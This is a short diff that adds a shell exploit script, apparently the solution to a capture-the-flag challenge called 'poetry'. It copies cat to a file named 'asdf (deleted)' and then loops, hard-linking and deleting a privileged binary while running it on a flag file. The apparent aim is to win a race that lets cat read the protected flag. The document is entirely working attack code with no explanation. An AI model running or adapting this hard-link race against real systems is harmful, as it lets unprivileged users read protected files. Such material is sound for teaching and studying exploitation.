@@ -1,0 +1,5 @@
+cd /home/user
+cp /bin/cat 'asdf (deleted)'
+while true; do ln /home/poetry/poetry ./asdf; ( ./asdf ../poetry/flag & ); rm asdf; done
+
+
